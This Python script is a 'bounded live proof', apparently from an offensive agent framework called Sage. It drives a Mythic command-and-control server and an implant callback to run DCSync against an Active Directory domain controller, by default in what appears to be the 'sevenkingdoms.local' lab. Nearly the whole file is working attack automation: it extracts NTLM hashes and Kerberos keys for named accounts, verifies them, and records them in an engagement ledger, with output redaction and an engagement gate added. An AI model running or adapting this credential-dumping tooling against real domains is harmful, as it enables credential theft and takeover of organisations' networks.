#!/usr/bin/env python3
"""Bounded live proof for generic dcsync-account capability execution.

No LLM is used. The script builds Sage's payload-agnostic `dcsync-account` capability into Mythic
commands, issues one DCSync per requested account from the selected callback, and reconciles any verified
secret material through the Sage `state reconcile` command.
"""

from __future__ import annotations

import argparse
import asyncio
import json
import os
import re
import sys
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[3]
os.environ.setdefault("SAGE_ENGAGEMENT_GATE", "1")
os.environ.setdefault("SAGE_ENGAGEMENT_STATE_DIR", str(ROOT / "Payload_Type" / "sage" / ".sage_engagement"))

sys.path.insert(0, str(ROOT / "skills" / "sage-live-runner" / "scripts"))
from mythic import mythic  # noqa: E402
from sage_task import resolve_password  # noqa: E402

sys.path.insert(0, str(ROOT / "Payload_Type" / "sage" / "ai" / "langgraph"))

import capabilities  # noqa: E402
import credential_artifacts  # noqa: E402
import engagement_ledger  # noqa: E402
import mythic_tools  # noqa: E402

SERVER = "127.0.0.1"
USER = "mythic_admin"

SECRET_LINE_RE = re.compile(
    r"(?im)^.*(?:hash\s+ntlm|\bntlm(?:-\s*\d+)?|aes256[_-]?hmac|aes128[_-]?hmac|rc4[_-]?hmac).*$"
)
SECRET_FLAG_RE = re.compile(r"(?i)(/(?:aes256|aes128|rc4|ntlm|krbtgt_hash):)([0-9a-f]{32,64})")
LONG_B64_RE = re.compile(r"(?<![A-Za-z0-9+/=])([A-Za-z0-9+/=]{160,})(?![A-Za-z0-9+/=])")
KEY_NAMES = {"key", "credential", "credential_text", "secret", "aes256", "aes128", "rc4", "ntlm", "krbtgt_hash"}


def _redact(value: Any) -> Any:
    if isinstance(value, dict):
        out = {}
        for key, item in value.items():
            out[key] = "<redacted>" if str(key).casefold() in KEY_NAMES and item else _redact(item)
        return out
    if isinstance(value, list):
        return [_redact(item) for item in value]
    if isinstance(value, str):
        text = credential_artifacts.redact_credential_material(value)
        text = SECRET_LINE_RE.sub("<redacted-secret-line>", text)
        text = SECRET_FLAG_RE.sub(lambda match: f"{match.group(1)}<redacted>", text)
        return LONG_B64_RE.sub("<redacted-base64>", text)
    return value


def _tail(value: Any, limit: int = 1800) -> str:
    return _redact(str(value or ""))[-limit:]


def _command_summary(command: dict[str, Any]) -> str:
    return json.dumps(_redact({
        "command": command.get("command"),
        "parameters": command.get("parameters"),
        "capability": command.get("capability"),
        "purpose": command.get("purpose"),
        "expected_probe": command.get("expected_probe"),
    }), sort_keys=True)


def _callback_payload_type(callback: dict[str, Any]) -> str:
    payload = callback.get("payload") if isinstance(callback.get("payload"), dict) else {}
    payload_type = payload.get("payloadtype") if isinstance(payload.get("payloadtype"), dict) else {}
    return str(payload_type.get("name") or callback.get("payloadtype") or "")


def _account_list(value: str) -> list[str]:
    return [item.strip() for item in str(value or "").split(",") if item.strip()]


async def _reconcile_task(client, sage_callback: int, task_id: int, timeout: int) -> str:
    task = await mythic.issue_task(
        mythic=client,
        command_name="state",
        parameters=json.dumps({"action": "reconcile", "task_id": int(task_id)}),
        callback_display_id=int(sage_callback),
        wait_for_complete=False,
    )
    reconcile_id = int(task.get("display_id") or task.get("id"))
    output = await mythic.waitfor_for_task_output(client, task_display_id=reconcile_id, timeout=timeout)
    return str(output or "")


async def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--callback", type=int, default=int(os.environ.get("APOLLO_CB", "13")))
    parser.add_argument("--sage-callback", type=int, default=int(os.environ.get("SAGE_CB", "12")))
    parser.add_argument("--domain", default="sevenkingdoms.local")
    parser.add_argument("--dc", default="kingslanding.sevenkingdoms.local")
    parser.add_argument("--accounts", default=os.environ.get("DCSYNC_ACCOUNTS", "cersei.lannister,lord.varys"))
    parser.add_argument("--timeout", type=int, default=120)
    args = parser.parse_args()

    mythic_tools.ENGAGEMENT_GATE_ENABLED = True
    client = await mythic.login(server_ip=SERVER, username=USER, password=resolve_password())
    callbacks = await mythic.get_all_active_callbacks(client)
    callback = next((item for item in callbacks if int(item.get("display_id") or 0) == args.callback), {})
    if not callback:
        print(f"ERROR: callback {args.callback} not found")
        return 1
    print(
        f"target callback: cb{args.callback} payload={_callback_payload_type(callback)} "
        f"host={callback.get('host')} user={callback.get('user')}"
    )

    tools = mythic_tools.MythicTools(agent_task_id="focused-dcsync-account")
    tools.client = client
    await tools._ensure_engagement_key()
    print(f"engagement: {tools._eng_key()}")
    original_objective = str(engagement_ledger.load(tools._eng_key()).get("objective") or "")

    for account in _account_list(args.accounts):
        effect = f"creds:{account.casefold()}@{args.domain.casefold()}"
        action = capabilities.CapabilityAction(
            name="dcsync-account",
            target=f"domain={args.domain};account={account}",
            preconditions=[f"ds-replication-rights:{args.domain}", "live-foothold:*"],
            effects=[effect],
            intent={
                "capability": "dcsync-account",
                "domain": args.domain,
                "account": account,
            },
        )
        raw_plan = await tools.build_capability_commands(action, {"dc": args.dc})
        plan = json.loads(raw_plan)
        print(f"\naccount={account} builder ok={plan.get('ok')} reason={plan.get('reason')}")
        if not plan.get("ok"):
            print(json.dumps(_redact(plan), indent=2, sort_keys=True))
            continue

        commands = list(plan.get("commands") or [])
        if len(commands) != 1:
            print(f"ERROR: expected one DCSync command, got {len(commands)}")
            continue
        command = commands[0]
        print(f"issuing {_command_summary(command)}")
        output = await tools.issue_task_and_waitfor_task_output(
            str(command.get("command") or ""),
            command.get("parameters"),
            args.callback,
            timeout=args.timeout,
        )
        task_id = tools._last_issued_task_display_id
        probe = capabilities.extract_dcsync_secret_probe(output)
        verification = capabilities.verify_capability("dcsync-account", dict(probe))
        print(f"task_id={task_id} verdict={verification.verdict} reason={verification.reason}")
        print(f"output_tail:\n{_tail(output)}")
        if verification.verdict != "achieved":
            continue

        reconcile_output = await _reconcile_task(client, args.sage_callback, int(task_id), args.timeout)
        print(f"reconcile_tail:\n{_tail(reconcile_output, 2200)}")
        if original_objective:
            data = engagement_ledger.load(tools._eng_key())
            data["objective"] = original_objective
            engagement_ledger.save(data, tools._eng_key())
        print(f"RESULT: achieved {effect} from task {task_id}")
        return 0

    if original_objective:
        data = engagement_ledger.load(tools._eng_key())
        data["objective"] = original_objective
        engagement_ledger.save(data, tools._eng_key())
    print("RESULT: no requested account DCSync returned verified secret material")
    return 2


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
